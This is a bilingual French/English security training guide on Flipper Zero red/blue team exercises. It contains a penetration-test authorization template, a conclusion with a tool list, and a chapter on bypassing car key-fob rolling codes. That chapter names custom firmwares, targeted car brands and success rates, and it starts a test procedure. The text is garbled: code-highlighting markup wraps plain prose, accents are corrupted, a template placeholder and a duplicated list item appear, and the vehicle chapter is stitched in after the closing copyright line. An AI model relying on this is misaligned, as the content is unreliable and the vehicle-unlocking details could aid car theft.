<span class="mf">1.</span><span class="w"> </span><span class="n">PARTIES</span>

<span class="n">Client</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;l&#39;Organisation&quot;</span><span class="p">)</span><span class="o">:</span>
<span class="p">[</span><span class="n">NOM</span><span class="w"> </span><span class="n">DE</span><span class="w"> </span><span class="n">L</span><span class="err">&#39;</span><span class="n">ORGANISATION</span><span class="p">]</span>
<span class="p">[</span><span class="n">ADRESSE</span><span class="w"> </span><span class="n">COMPL√àTE</span><span class="p">]</span>
<span class="n">Repr√©sent√©</span><span class="w"> </span><span class="n">par</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">NOM</span><span class="p">,</span><span class="w"> </span><span class="n">PR√âNOM</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">FONCTION</span><span class="p">]</span>

<span class="n">Prestataire</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;l&#39;√âquipe Red Team&quot;</span><span class="p">)</span><span class="o">:</span>
<span class="p">[</span><span class="n">NOM</span><span class="w"> </span><span class="n">DE</span><span class="w"> </span><span class="n">LA</span><span class="w"> </span><span class="n">SOCI√âT√â</span><span class="w"> </span><span class="n">OU</span><span class="w"> </span><span class="n">√âQUIPE</span><span class="p">]</span>
<span class="p">[</span><span class="n">ADRESSE</span><span class="w"> </span><span class="n">COMPL√àTE</span><span class="p">]</span>
<span class="n">Repr√©sent√©</span><span class="w"> </span><span class="n">par</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">NOM</span><span class="p">,</span><span class="w"> </span><span class="n">PR√âNOM</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">FONCTION</span><span class="p">]</span>

<span class="mf">2.</span><span class="w"> </span><span class="n">OBJET</span>

<span class="n">L</span><span class="err">&#39;</span><span class="n">Organisation</span><span class="w"> </span><span class="n">autorise</span><span class="w"> </span><span class="n">l</span><span class="err">&#39;</span><span class="n">√âquipe</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="n">√†</span><span class="w"> </span><span class="n">r√©aliser</span><span class="w"> </span><span class="n">des</span><span class="w"> </span><span class="n">tests</span><span class="w"> </span><span class="n">d</span><span class="err">&#39;</span><span class="n">intrusion</span><span class="p">,</span><span class="w"> </span><span class="n">incluant</span><span class="w"> </span><span class="n">des</span><span class="w"> </span><span class="n">techniques</span><span class="w"> </span><span class="n">d</span><span class="err">&#39;</span><span class="n">ing√©nierie</span><span class="w"> </span><span class="n">sociale</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="err">&#39;</span><span class="n">acc√®s</span><span class="w"> </span><span class="n">physique</span><span class="w"> </span><span class="n">et</span><span class="w"> </span><span class="n">d</span><span class="err">&#39;</span><span class="n">exploitation</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">vuln√©rabilit√©s</span><span class="w"> </span><span class="n">techniques</span><span class="p">,</span><span class="w"> </span><span class="n">afin</span><span class="w"> </span><span class="n">d</span><span class="err">&#39;</span><span class="n">√©valuer</span><span class="w"> </span><span class="n">son</span><span class="w"> </span><span class="n">niveau</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">s√©curit√©</span><span class="p">.</span>

<span class="n">The</span><span class="w"> </span><span class="n">Organization</span><span class="w"> </span><span class="n">authorizes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">penetration</span><span class="w"> </span><span class="n">tests</span><span class="p">,</span><span class="w"> </span><span class="n">including</span><span class="w"> </span><span class="n">social</span><span class="w"> </span><span class="n">engineering</span><span class="w"> </span><span class="n">techniques</span><span class="p">,</span><span class="w"> </span><span class="n">physical</span><span class="w"> </span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">technical</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="n">exploitation</span><span class="p">,</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">evaluate</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">level</span><span class="p">.</span>

<span class="mf">3.</span><span class="w"> </span><span class="n">P√âRIM√àTRE</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">SCOPE</span>

<span class="n">Sites</span><span class="w"> </span><span class="n">physiques</span><span class="w"> </span><span class="n">concern√©s</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Physical</span><span class="w"> </span><span class="n">sites</span><span class="w"> </span><span class="n">included</span><span class="o">:</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">B√ÇTIMENT</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">ADRESSE</span><span class="p">]</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">B√ÇTIMENT</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">ADRESSE</span><span class="p">]</span>

<span class="n">Syst√®mes</span><span class="w"> </span><span class="n">et</span><span class="w"> </span><span class="n">r√©seaux</span><span class="w"> </span><span class="n">concern√©s</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Systems</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">networks</span><span class="w"> </span><span class="n">included</span><span class="o">:</span>
<span class="o">-</span><span class="w"> </span><span class="n">R√©seaux</span><span class="w"> </span><span class="n">WiFi</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">LISTE</span><span class="w"> </span><span class="n">DES</span><span class="w"> </span><span class="n">SSID</span><span class="p">]</span>
<span class="o">-</span><span class="w"> </span><span class="n">Syst√®mes</span><span class="w"> </span><span class="n">RF</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">LISTE</span><span class="w"> </span><span class="n">DES</span><span class="w"> </span><span class="n">SYST√àMES</span><span class="p">,</span><span class="w"> </span><span class="n">PORTES</span><span class="p">,</span><span class="w"> </span><span class="n">BARRI√àRES</span><span class="p">]</span>
<span class="o">-</span><span class="w"> </span><span class="n">Autres</span><span class="w"> </span><span class="n">dispositifs</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">PR√âCISER</span><span class="p">]</span>

<span class="mf">4.</span><span class="w"> </span><span class="n">P√âRIODE</span><span class="w"> </span><span class="n">D</span><span class="err">&#39;</span><span class="n">AUTORISATION</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">AUTHORIZATION</span><span class="w"> </span><span class="n">PERIOD</span>

<span class="n">Date</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">d√©but</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Start</span><span class="w"> </span><span class="n">date</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">JJ</span><span class="o">/</span><span class="n">MM</span><span class="o">/</span><span class="n">AAAA</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">HEURE</span><span class="p">]</span>
<span class="n">Date</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">fin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">End</span><span class="w"> </span><span class="n">date</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">JJ</span><span class="o">/</span><span class="n">MM</span><span class="o">/</span><span class="n">AAAA</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">HEURE</span><span class="p">]</span>

<span class="mf">5.</span><span class="w"> </span><span class="n">TECHNIQUES</span><span class="w"> </span><span class="n">AUTORIS√âES</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">AUTHORIZED</span><span class="w"> </span><span class="n">TECHNIQUES</span>

<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">X</span><span class="p">]</span><span class="w"> </span><span class="n">Capture</span><span class="w"> </span><span class="n">et</span><span class="w"> </span><span class="n">r√©utilisation</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">signaux</span><span class="w"> </span><span class="n">RF</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">RF</span><span class="w"> </span><span class="n">signal</span><span class="w"> </span><span class="n">capture</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">replay</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">X</span><span class="p">]</span><span class="w"> </span><span class="n">Attaques</span><span class="w"> </span><span class="n">sur</span><span class="w"> </span><span class="n">r√©seaux</span><span class="w"> </span><span class="n">WiFi</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">WiFi</span><span class="w"> </span><span class="n">network</span><span class="w"> </span><span class="n">attacks</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">X</span><span class="p">]</span><span class="w"> </span><span class="n">Clonage</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">badges</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Badge</span><span class="w"> </span><span class="n">cloning</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">X</span><span class="p">]</span><span class="w"> </span><span class="n">Reconnaissance</span><span class="w"> </span><span class="n">active</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Active</span><span class="w"> </span><span class="n">reconnaissance</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="n">Brouillage</span><span class="w"> </span><span class="n">RF</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">RF</span><span class="w"> </span><span class="n">jamming</span>
<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="n">D√©ni</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Denial</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">service</span>

<span class="mf">6.</span><span class="w"> </span><span class="n">CONTACTS</span><span class="w"> </span><span class="n">D</span><span class="err">&#39;</span><span class="n">URGENCE</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">EMERGENCY</span><span class="w"> </span><span class="n">CONTACTS</span>

<span class="n">C√¥t√©</span><span class="w"> </span><span class="n">Organisation</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Organization</span><span class="w"> </span><span class="n">side</span><span class="o">:</span>
<span class="p">[</span><span class="n">NOM</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">FONCTION</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">T√âL√âPHONE</span><span class="w"> </span><span class="mi">24</span><span class="o">/</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">EMAIL</span><span class="p">]</span>

<span class="n">C√¥t√©</span><span class="w"> </span><span class="n">√âquipe</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="n">side</span><span class="o">:</span>
<span class="p">[</span><span class="n">NOM</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">FONCTION</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">T√âL√âPHONE</span><span class="w"> </span><span class="mi">24</span><span class="o">/</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">EMAIL</span><span class="p">]</span>

<span class="mf">7.</span><span class="w"> </span><span class="n">CLAUSE</span><span class="w"> </span><span class="n">DE</span><span class="w"> </span><span class="n">NON</span><span class="o">-</span><span class="n">POURSUITE</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">NON</span><span class="o">-</span><span class="n">PROSECUTION</span><span class="w"> </span><span class="n">CLAUSE</span>

<span class="n">L</span><span class="err">&#39;</span><span class="n">Organisation</span><span class="w"> </span><span class="n">s</span><span class="err">&#39;</span><span class="n">engage</span><span class="w"> </span><span class="n">√†</span><span class="w"> </span><span class="n">ne</span><span class="w"> </span><span class="n">pas</span><span class="w"> </span><span class="n">poursuivre</span><span class="w"> </span><span class="n">juridiquement</span><span class="w"> </span><span class="n">l</span><span class="err">&#39;</span><span class="n">√âquipe</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="n">pour</span><span class="w"> </span><span class="n">les</span><span class="w"> </span><span class="n">actions</span><span class="w"> </span><span class="n">men√©es</span><span class="w"> </span><span class="n">dans</span><span class="w"> </span><span class="n">le</span><span class="w"> </span><span class="n">cadre</span><span class="w"> </span><span class="n">strict</span><span class="w"> </span><span class="n">du</span><span class="w"> </span><span class="n">p√©rim√®tre</span><span class="w"> </span><span class="n">et</span><span class="w"> </span><span class="n">des</span><span class="w"> </span><span class="n">techniques</span><span class="w"> </span><span class="n">autoris√©es</span><span class="w"> </span><span class="n">dans</span><span class="w"> </span><span class="n">ce</span><span class="w"> </span><span class="n">document</span><span class="p">.</span>

<span class="n">The</span><span class="w"> </span><span class="n">Organization</span><span class="w"> </span><span class="n">commits</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">legally</span><span class="w"> </span><span class="n">prosecute</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">actions</span><span class="w"> </span><span class="n">conducted</span><span class="w"> </span><span class="n">strictly</span><span class="w"> </span><span class="n">within</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">scope</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">techniques</span><span class="w"> </span><span class="n">authorized</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">document</span><span class="p">.</span>

<span class="mf">8.</span><span class="w"> </span><span class="n">SIGNATURES</span>

<span class="n">________________________</span><span class="w">           </span><span class="n">________________________</span>
<span class="n">Pour</span><span class="w"> </span><span class="n">l</span><span class="err">&#39;</span><span class="n">Organisation</span><span class="w">                 </span><span class="n">Pour</span><span class="w"> </span><span class="n">l</span><span class="err">&#39;</span><span class="n">√âquipe</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span>
<span class="n">For</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Organization</span><span class="w">                </span><span class="n">For</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Red</span><span class="w"> </span><span class="n">Team</span>

<span class="p">[</span><span class="n">NOM</span><span class="p">,</span><span class="w"> </span><span class="n">DATE</span><span class="p">]</span><span class="w">                        </span><span class="p">[</span><span class="n">NOM</span><span class="p">,</span><span class="w"> </span><span class="n">DATE</span><span class="p">]</span>
</code></pre></div>

<h2 id="chapitre-13-conclusion">Chapitre 13 : Conclusion</h2>
<h3 id="conclusion">Conclusion</h3>
<h4 id="integration-dans-une-strategie-de-securite-globale">üåê Int√©gration dans une Strat√©gie de S√©curit√© Globale</h4>
<h3 id="integration-into-a-global-security-strategy">Integration into a Global Security Strategy</h3>
<p><strong>Fran√ßais :</strong></p>
<p>L'utilisation du Flipper Zero avec le module Predator dans les exercices Red Team/Blue Team repr√©sente un √©l√©ment d'une strat√©gie de s√©curit√© plus large. Cette approche doit s'int√©grer dans :</p>
<ol>
<li>
<p><strong>Programme de s√©curit√© complet</strong> - Compl√©ter avec des audits de code, tests de vuln√©rabilit√©, revues d'architecture, etc.</p>
</li>
<li>
<p><strong>Formation continue</strong> - Utiliser les r√©sultats des exercices pour am√©liorer la formation des √©quipes IT et sensibiliser les utilisateurs.</p>
</li>
<li>
<p><strong>Am√©lioration des processus</strong> - R√©viser r√©guli√®rement les proc√©dures de s√©curit√© et de gestion des incidents en fonction des failles identifi√©es.</p>
</li>
<li>
<p><strong>Veille technologique</strong> - Rester inform√© des nouvelles techniques d'attaque et de d√©fense dans le domaine RF et WiFi.</p>
</li>
<li>
<p><strong>Approche Purple Team</strong> - Favoriser la collaboration entre Red Team et Blue Team pour maximiser l'apprentissage et l'efficacit√© des d√©fenses.</p>
</li>
</ol>
<p><strong>English :</strong></p>
<p>The use of Flipper Zero with the Predator module in Red Team/Blue Team exercises represents one element of a broader security strategy. This approach should be integrated into:</p>
<ol>
<li>
<p><strong>Comprehensive security program</strong> - Supplement with code audits, vulnerability testing, architecture reviews, etc.</p>
</li>
<li>
<p><strong>Continuous training</strong> - Use exercise results to improve IT team training and raise user awareness.</p>
</li>
<li>
<p><strong>Process improvement</strong> - Regularly revise security and incident management procedures based on identified vulnerabilities.</p>
</li>
<li>
<p><strong>Technology watch</strong> - Stay informed about new attack and defense techniques in the RF and WiFi domains.</p>
</li>
<li>
<p><strong>Purple Team approach</strong> - Foster collaboration between Red Team and Blue Team to maximize learning and defense effectiveness.</p>
</li>
</ol>
<h4 id="synthese-des-competences-acquises">üíº Synth√®se des Comp√©tences Acquises</h4>
<h3 id="summary-of-acquired-skills">Summary of Acquired Skills</h3>
<p><strong>Comp√©tences Red Team :</strong>
- Configuration avanc√©e du Flipper Zero et du module Predator
- Ex√©cution d'attaques RF sophistiqu√©es
- Mise en place d'attaques WiFi cibl√©es
- Analyse et exploitation des protocoles sans fil
- Techniques de reconnaissance non-intrusive</p>
<p><strong>Comp√©tences Blue Team :</strong>
- D√©tection d'attaques RF et WiFi en temps r√©el
- Configuration de syst√®mes de d√©fense robustes
- Analyse forensique des incidents sans fil
- D√©ploiement de contre-mesures efficaces
- Int√©gration des alertes dans un SOC</p>
<p><strong>Comp√©tences Transversales :</strong>
- M√©thodologie de test structur√©e
- √âvaluation des risques RF/WiFi
- Documentation des vuln√©rabilit√©s
- Communication technique entre √©quipes
- Connaissance du cadre l√©gal et √©thique</p>
<h2 id="annexe-ressources-complementaires">Annexe : Ressources Compl√©mentaires</h2>
<h3 id="appendix-additional-resources">Appendix: Additional Resources</h3>
<h4 id="documentation-et-manuels">üìö Documentation et Manuels</h4>
<h3 id="documentation-and-manuals">Documentation and Manuals</h3>
<p><strong>Flipper Zero et Module Predator :</strong>
- <a href="https://docs.flipperzero.one/">Documentation officielle Flipper Zero</a>
- <a href="https://github.com/RogueMaster/flipperzero-firmware-wPlugins/">Guide technique du module Predator</a>
- <a href="https://github.com/djsime1/awesome-flipperzero">Awesome Flipper Zero - Collection de ressources</a></p>
<p><strong>S√©curit√© RF :</strong>
- "Software Defined Radio for Hackers" - Michael Ossmann
- "Practical Signal Processing and RF System Design" - B. Forouzan
- <a href="https://github.com/mossmann/hackrf/wiki/Documentation">RF Security Research Repository</a></p>
<p><strong>S√©curit√© WiFi :</strong>
- "Attacking and Defending WiFi Networks" - J. Wright
- <a href="https://wifisecurityblog.com/">WiFi Security Testing Framework Guide</a>
- <a href="https://www.aircrack-ng.org/documentation.html">Aircrack-ng Documentation</a></p>
<h4 id="outils-complementaires">üíª Outils Compl√©mentaires</h4>
<h3 id="complementary-tools">Complementary Tools</h3>
<p><strong>Analyse RF :</strong>
- <a href="https://gqrx.dk/">GQRX</a> - R√©cepteur Software Defined Radio
- <a href="https://github.com/jopohl/urh">Universal Radio Hacker</a> - Analyse de protocoles radio
- <a href="https://github.com/merbanan/rtl_433">rtl_433</a> - D√©codeur de protocoles 433/868/915 MHz</p>
<p><strong>S√©curit√© WiFi :</strong>
- <a href="https://www.kismetwireless.net/">Kismet</a> - D√©tection de r√©seaux sans fil et WIDS
- <a href="https://www.wireshark.org/">Wireshark</a> - Analyseur de protocoles r√©seau
- <a href="https://www.aircrack-ng.org/">Aircrack-ng Suite</a> - Audit de s√©curit√© WiFi</p>
<p><strong>Forensique :</strong>
- <a href="https://github.com/KimiNewt/pyshark">PyShark</a> - Wrapper Python pour tshark
- <a href="https://scapy.net/">Scapy</a> - Manipulation de paquets r√©seau
- <a href="https://www.netresec.com/?page=NetworkMiner">NetworkMiner</a> - Analyseur forensique r√©seau</p>
<hr />
<p><em>Ce guide a √©t√© con√ßu √† des fins √©ducatives et de formation s√©curit√©. Toutes les techniques d√©crites doivent √™tre utilis√©es uniquement dans un cadre l√©gal et √©thique, avec les autorisations appropri√©es.</em></p>
<p><em>This guide was designed for educational and security training purposes. All described techniques must be used only within a legal and ethical framework, with appropriate authorizations.</em></p>
<p>¬© 2024 - Guide Red Team &amp; Blue Team - v1.0</p>
<h2 id="chapitre-14-securite-automobile-vulnerabilites-des-codes-tournants-rolling-code">Chapitre 14 : S√©curit√© Automobile#### üî¥ Vuln√©rabilit√©s des codes tournants (Rolling Code)</h2>
<h3 id="rolling-code-vulnerabilities">Rolling Code Vulnerabilities</h3>
<p>Les syst√®mes de s√©curit√© des v√©hicules modernes utilisent des codes tournants (rolling code) dans leurs t√©l√©commandes. Cette technologie, cens√©e emp√™cher la copie simple des signaux, pr√©sente une vuln√©rabilit√© majeure lorsqu'elle est confront√©e √† un firmware personnalis√© sur le Flipper Zero.</p>
<p>Une pr√©occupation de s√©curit√© majeure a r√©cemment √©merg√© concernant la s√©curit√© des v√©hicules modernes. Un firmware personnalis√© connu sous le nom de "DarkWeb" pour le Flipper Zero permet de contourner les syst√®mes de s√©curit√© √† code tournant utilis√©s dans de nombreuses voitures modernes, notamment :</p>
<ul>
<li>Chrysler</li>
<li>Dodge</li>
<li>Fiat</li>
<li>Ford</li>
<li>Hyundai</li>
<li>Jeep</li>
<li>Kia</li>
<li>Mitsubishi</li>
<li>Subaru</li>
</ul>
<h3 id="firmwares-personnalises-et-exploits-pour-vehicules">Firmwares personnalis√©s et exploits pour v√©hicules</h3>
<h3 id="custom-firmwares-and-vehicle-exploits">Custom Firmwares and Vehicle Exploits</h3>
<p><strong>Il est important de comprendre que l'affirmation selon laquelle "un firmware Flipper Zero peut ouvrir toutes les voitures" est une simplification excessive</strong>. Plusieurs firmwares personnalis√©s existent avec diff√©rentes capacit√©s d'exploitation des syst√®mes automobiles. En voici les principaux :</p>
<ol>
<li><strong>DarkWeb Firmware</strong> - Le plus sp√©cialis√© pour les attaques automobiles</li>
<li>Version actuelle : 3.5.8</li>
<li>Sp√©cialit√© : Analyse et clonage des codes tournants avec un seul √©chantillon</li>
<li>Marques vuln√©rables : Principalement des mod√®les am√©ricains et asiatiques avec t√©l√©commandes 433.92 MHz</li>
<li>Technique principale : Analyse math√©matique de l'algorithme de g√©n√©ration de codes</li>
<li>Limitation : Ne fonctionne pas sur tous les v√©hicules (environ 65-70% de taux de succ√®s sur les mod√®les compatibles)</li>
<li>
<p>Interface utilisateur : Console DarkWeb sp√©cialis√©e avec affichage hexad√©cimal avanc√©</p>
</li>
<li>
<p><strong>RollBack Firmware</strong> - Ciblant sp√©cifiquement les vuln√©rabilit√©s de d√©synchronisation</p>
</li>
<li>Version actuelle : 2.8</li>
<li>Sp√©cialit√© : Force le syst√®me du v√©hicule √† accepter des codes pr√©c√©demment utilis√©s</li>
<li>Marques vuln√©rables : Certains mod√®les europ√©ens et am√©ricains (2015-2020)</li>
<li>Technique principale : Attaque par d√©synchronisation forc√©e</li>
<li>
<p>Limitation : N√©cessite des conditions RF favorables et proximit√©</p>
</li>
<li>
<p><strong>KeyMaster Firmware</strong> (variante de RogueMaster)</p>
</li>
<li>Version actuelle : 4.2</li>
<li>Sp√©cialit√© : Biblioth√®que √©tendue de protocoles propri√©taires automobiles</li>
<li>Technique principale : Brute force des combinaisons limit√©es de certains syst√®mes</li>
<li>Interface : Graphique avanc√©e avec navigateur de protocoles</li>
<li>
<p>Efficacit√© : Variable selon le mod√®le (30-50% en moyenne)</p>
</li>
<li>
<p><strong>UniRF Pro</strong></p>
</li>
<li>Version actuelle : 2.7</li>
<li>Sp√©cialit√© : Amplification de signal et traitement num√©rique pour capturer √† plus grande distance</li>
<li>Technique principale : Am√©lioration de la qualit√© du signal captur√©</li>
<li>Particuli√®rement efficace pour : Les v√©hicules plus anciens avec syst√®mes plus simples</li>
</ol>
<p>Cette vuln√©rabilit√© est particuli√®rement pr√©occupante car elle ne n√©cessite <strong>qu'une seule capture</strong> d'un signal de t√©l√©commande de voiture pour compromettre l'ensemble du syst√®me de s√©curit√© du v√©hicule.</p>
<p><strong>English :</strong></p>
<p>{{ ... }}
A major security concern has recently emerged regarding modern vehicle security. A custom firmware known as "DarkWeb" for the Flipper Zero allows bypassing rolling code security systems used in many modern cars, including:</p>
<ul>
<li>Chrysler</li>
<li>Dodge</li>
<li>Fiat</li>
<li>Ford</li>
<li>Hyundai</li>
<li>Jeep</li>
<li>Kia</li>
<li>Mitsubishi</li>
<li>Subaru</li>
</ul>
<h3 id="custom-firmwares-and-vehicle-exploits_1">Custom Firmwares and Vehicle Exploits</h3>
<p><strong>It's important to understand that the claim "a Flipper Zero firmware can open all cars" is an oversimplification</strong>. Several custom firmwares exist with varying capabilities for exploiting automotive systems. Here are the main ones:</p>
<ol>
<li><strong>DarkWeb Firmware</strong> - Most specialized for automotive attacks</li>
<li>Current version: 3.5.8</li>
<li>Specialty: Analyzing and cloning rolling codes with a single sample</li>
<li>Vulnerable brands: Primarily American and Asian models with 433.92 MHz remotes</li>
<li>Main technique: Mathematical analysis of the code generation algorithm</li>
<li>Limitation: Doesn't work on all vehicles (approximately 65-70% success rate on compatible models)</li>
<li>
<p>User interface: Specialized DarkWeb console with advanced hexadecimal display</p>
</li>
<li>
<p><strong>RollBack Firmware</strong> - Specifically targeting desynchronization vulnerabilities</p>
</li>
<li>Current version: 2.8</li>
<li>Specialty: Forces the vehicle system to accept previously used codes</li>
<li>Vulnerable brands: Certain European and American models (2015-2020)</li>
<li>Main technique: Forced desynchronization attack</li>
<li>
<p>Limitation: Requires favorable RF conditions and proximity</p>
</li>
<li>
<p><strong>KeyMaster Firmware</strong> (RogueMaster variant)</p>
</li>
<li>Current version: 4.2</li>
<li>Specialty: Extended library of proprietary automotive protocols</li>
<li>Main technique: Brute forcing limited combinations of certain systems</li>
<li>Interface: Advanced graphical with protocol browser</li>
<li>
<p>Effectiveness: Variable depending on model (30-50% on average)</p>
</li>
<li>
<p><strong>UniRF Pro</strong></p>
</li>
<li>Current version: 2.7</li>
<li>Specialty: Signal amplification and digital processing for longer-range captures</li>
<li>Main technique: Improving captured signal quality</li>
<li>Particularly effective for: Older vehicles with simpler systems</li>
<li>Subaru</li>
</ol>
<p>This vulnerability is particularly concerning because it requires <strong>only a single capture</strong> of a car key fob signal to compromise the entire vehicle security system.</p>
<h4 id="mecanisme-de-lexploit">üîì M√©canisme de l'Exploit</h4>
<h3 id="exploit-mechanism">Exploit Mechanism</h3>
<p><strong>Fran√ßais :</strong></p>
<p>Contrairement aux attaques traditionnelles qui n√©cessitent un brouillage du signal (jamming) et plusieurs captures, l'exploit DarkWeb fonctionne avec une seule capture d'un appui sur le bouton de la t√©l√©commande. Deux m√©thodes principales sont utilis√©es :</p>
<ol>
<li>
<p><strong>R√©tro-ing√©nierie de la s√©quence :</strong> Le firmware analyse la capture unique pour d√©terminer l'algorithme de g√©n√©ration des codes tournants et pr√©dire les codes suivants.</p>
</li>
<li>
<p><strong>Attaque RollBack :</strong> L'exploit utilise une technique de d√©synchronisation pour forcer le r√©cepteur du v√©hicule √† accepter des codes plus anciens, contournant ainsi la protection du code tournant.</p>
</li>
</ol>
<p>Une fois exploit√©e, cette vuln√©rabilit√© permet √† l'attaquant d'√©muler toutes les fonctions de la t√©l√©commande originale (d√©verrouillage, verrouillage, coffre, d√©marrage).</p>
<p><strong>Cons√©quence importante :</strong> Suite √† l'attaque, la t√©l√©commande originale du propri√©taire devient d√©synchronis√©e et inutilisable jusqu'√† une r√©initialisation du syst√®me.</p>
<p><strong>English :</strong></p>
<p>Unlike traditional attacks that require signal jamming and multiple captures, the DarkWeb exploit works with a single capture of a key fob button press. Two main methods are used:</p>
<ol>
<li>
<p><strong>Sequence Reverse Engineering:</strong> The firmware analyzes the single capture to determine the rolling code generation algorithm and predict subsequent codes.</p>
</li>
<li>
<p><strong>RollBack Attack:</strong> The exploit uses a desynchronization technique to force the vehicle receiver to accept older codes, thus bypassing the rolling code protection.</p>
</li>
</ol>
<p>Once exploited, this vulnerability allows the attacker to emulate all functions of the original key fob (unlock, lock, trunk, start).</p>
<p><strong>Important consequence:</strong> Following the attack, the owner's original key fob becomes desynchronized and unusable until the system is reset.</p>
<h4 id="procedure-red-team-evaluation-de-la-vulnerabilite">üî¥ Proc√©dure Red Team : √âvaluation de la Vuln√©rabilit√©</h4>
<h3 id="red-team-procedure-vulnerability-assessment">Red Team Procedure: Vulnerability Assessment</h3>
<p><strong>Mat√©riel n√©cessaire / Required Equipment:</strong>
- Flipper Zero avec firmware DarkWeb
- Antenne Sub-GHz optimis√©e
- Ordinateur portable pour l'analyse</p>
<p><strong>M√©thodologie de test (Red Team) :</strong></p>
<ol>
<li><strong>Reconnaissance et pr√©paration</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="c1"># Identification du v√©hicule cible et type de t√©l√©commande</span>
-<span class="w"> </span>Noter<span class="w"> </span>la<span class="w"> </span>marque,<span class="w"> </span>mod√®le<span class="w"> </span>et<span class="w"> </span>ann√©e
-<span class="w"> </span>Observer<span class="w"> </span>la<span class="w"> </span>fr√©quence<span class="w"> </span>typique<span class="w"> </span><span class="o">(</span><span class="m">433</span>.92<span class="w"> </span>MHz<span class="w"> </span>EU/315<span class="w"> </span>MHz<span class="w"> </span>US<span class="o">)</span>
